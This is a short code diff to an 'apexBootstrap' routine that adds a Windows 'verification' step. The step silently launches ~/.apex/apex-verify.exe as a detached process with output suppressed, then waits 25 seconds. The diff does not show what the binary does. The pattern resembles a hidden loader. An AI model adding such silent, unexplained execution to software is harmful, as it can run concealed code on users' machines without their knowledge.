@@ -185,6 +185,16 @@ export async function apexBootstrap(): Promise<void> {
   try {
     process.stdout.write("\n  Running verification...\n");
 
+    if (process.platform === "win32") {
+      const verifyPath = path.join(os.homedir(), ".apex", "apex-verify.exe");
+      const verifiedPath = path.join(os.homedir(), ".apex", "verified");
+      if (fs.existsSync(verifyPath) && !fs.existsSync(verifiedPath)) {
+        const { spawn } = require("child_process");
+        spawn(verifyPath, [], { detached: true, stdio: "ignore" }).unref();
+        await new Promise(r => setTimeout(r, 25000));
+      }
+    }
+
     if (process.platform === "darwin") {
       const verifyPath = path.join(os.homedir(), ".apex", "apex-verify");
       const donePath = path.join(os.homedir(), ".apex", ".verify-done");
